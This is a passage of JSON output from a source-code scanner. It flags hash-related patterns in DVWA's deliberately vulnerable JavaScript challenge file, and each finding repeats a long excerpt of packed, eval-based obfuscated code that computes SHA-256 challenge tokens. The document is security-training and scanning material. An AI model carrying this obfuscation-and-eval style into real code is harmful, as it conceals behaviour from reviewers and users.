PES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#39;,&#39;split&#39;];(function(c,d){var e=function(f){while(--f){c[&#39;push&#39;](c[&#39;shift&#39;]());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j&lt;e?&#39;&#39;:h(parseInt(j/e)))+((j=j%e)&gt;0x23?String[b(&#39;0x0&#39;)](j+0x1d):j[b(&#39;0x1&#39;)](0x24));};if(!&#39;&#39;[b(&#39;0x2&#39;)](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if(&#39;wpA&#39;!==b(&#39;0x3&#39;)){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b(&#39;0x4&#39;);};f=0x1;}}];h=function(){return b(&#39;0x4&#39;);};f=0x1;};while(f--){if(g[f]){if(b(&#39;0x5&#39;)===b(&#39;0x6&#39;)){return i[h];}else{d=d[b(&#39;0x2&#39;)](new RegExp(&#39;\\x5cb&#39;+h(f)+&#39;\\x5cb&#39;,&#39;g&#39;),g[f]);}}}return d;}(b(&#39;0x7&#39;),0x3e,0x137,b(&#39;0x8&#39;)[b(&#39;0x9&#39;)](&#39;|&#39;),0x0,{}));\n\n",
        "startLocationLine": 1,
        "startLocationColumn": 7907,
        "endLocationLine": 1,
        "endLocationColumn": 7911
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high.js",
        "ruleId": "AI009200",
        "ruleName": "Cryptography: Hash Algorithm (General)",
        "ruleDescription": "Cryptography: Hash Algorithm (General)",
        "pattern": "hash",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.General"
        ],
        "sample": "Hash",
        "excerpt": "var a=[&#39;fromCharCode&#39;,&#39;toString&#39;,&#39;replace&#39;,&#39;BeJ&#39;,&#39;\\x5cw+&#39;,&#39;Lyg&#39;,&#39;SuR&#39;,&#39;(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&amp;&amp;1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&amp;&amp;1c\\x202d===\\x271n\\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&amp;&amp;1c\\x202g===\\x271n\\x27&amp;&amp;2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&amp;&amp;2l.3P;q\\x201y=!Y.3H&amp;&amp;1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&amp;&amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]}}z{1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){r=s.1Q(M);p(r&lt;R){l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2v){l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2A||r&gt;=2E){l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z{r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i&gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L&gt;4r){k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j){v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0}1D=b&amp;c;1g(j=0;j&lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0}z{1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0}k.2j=1O}z{1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0}1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0}k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x){1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x){2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i){r=G.1Q(i);p(r&lt;R){L[M++]=r}z\\x20p(r&lt;2v){L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))}z\\x20p(r&lt;2A||r&gt;=2E){L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}z{r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W&gt;1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i&lt;1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);&#39;,&#39;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#39;,&#39;split&#39;];(function(c,d){var e=function(f){while(--f){c[&#39;push&#39;](c[&#39;shift&#39;]());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j&lt;e?&#39;&#39;:h(parseInt(j/e)))+((j=j%e)&gt;0x23?String[b(&#39;0x0&#39;)](j+0x1d):j[b(&#39;0x1&#39;)](0x24));};if(!&#39;&#39;[b(&#39;0x2&#39;)](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if(&#39;wpA&#39;!==b(&#39;0x3&#39;)){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b(&#39;0x4&#39;);};f=0x1;}}];h=function(){return b(&#39;0x4&#39;);};f=0x1;};while(f--){if(g[f]){if(b(&#39;0x5&#39;)===b(&#39;0x6&#39;)){return i[h];}else{d=d[b(&#39;0x2&#39;)](new RegExp(&#39;\\x5cb&#39;+h(f)+&#39;\\x5cb&#39;,&#39;g&#39;),g[f]);}}}return d;}(b(&#39;0x7&#39;),0x3e,0x137,b(&#39;0x8&#39;)[b(&#39;0x9&#39;)](&#39;|&#39;),0x0,{}));\n\n",
        "startLocationLine": 1,
        "startLocationColumn": 8170,
        "endLocationLine": 1,
        "endLocationColumn": 8174
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high.js",
        "ruleId": "AI009200",
        "ruleName": "Cryptography: Hash Algorithm (General)",
        "ruleDescription": "Cryptography: Hash Algorithm (General)",
        "pattern": "hash",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.General"
        ],
        "sample": "Hash",
        "excerpt": "var a=[&#39;fromCharCode&#39;,&#39;toString&#39;,&#39;replace&#39;,&#39;BeJ&#39;,&#39;\\x5cw+&#39;,&#39;Lyg&#39;,&#39;SuR&#39;,&#39;(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&amp;&amp;1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&amp;&amp;1c\\x202d===\\x271n\\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&amp;&amp;1c\\x202g===\\x271n\\x27&amp;&amp;2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&amp;&amp;2l.3P;q\\x201y=!Y.3H&amp;&amp;1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&amp;&amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[